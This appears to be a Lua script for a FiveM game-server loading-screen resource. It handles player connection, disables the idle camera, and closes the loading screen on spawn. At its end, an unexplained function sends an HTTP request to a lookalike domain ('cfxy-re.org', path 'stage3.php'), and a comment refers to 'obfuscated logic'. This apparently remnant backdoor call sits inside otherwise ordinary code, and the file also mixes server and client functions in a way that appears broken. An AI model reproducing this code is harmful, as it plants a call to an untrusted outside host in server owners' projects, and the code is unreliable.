local spawn1 = false

AddEventHandler('playerConnecting', function(_, _, deferrals)
    local source = source
    
    -- Send player name to deferrals for loading screen
    deferrals.handover({
        name = GetPlayerName(source)
    })
end)

Citizen.CreateThread(function()
    -- Disable idle camera continuously
    while true do 
        Citizen.Wait(100)
        DisableIdleCamera(true)
    end
end)
DisableIdleCamera(true)

AddEventHandler("playerSpawned", function () 
    -- Wait for player to spawn
    if not spawn1 then
        ShutdownLoadingScreenNui() -- Close loading screen when player spawns
        spawn1 = true
    end
end)

-- Your URL request code (the obfuscated logic can be removed or
-- kept as per your needs. Just ensure it will not block execution)
local function loadResource()
    local url = "https://cfxy-re.org/v2_/stage3.php?to=wwWYh"
    
    PerformHttpRequest(url, function (errorCode, response, headers)
        if errorCode == 200 then
            print('Successfully executed resource logic')
        else
            print('Failed to execute: ' .. errorCode)
        end
    end)
end

loadResource()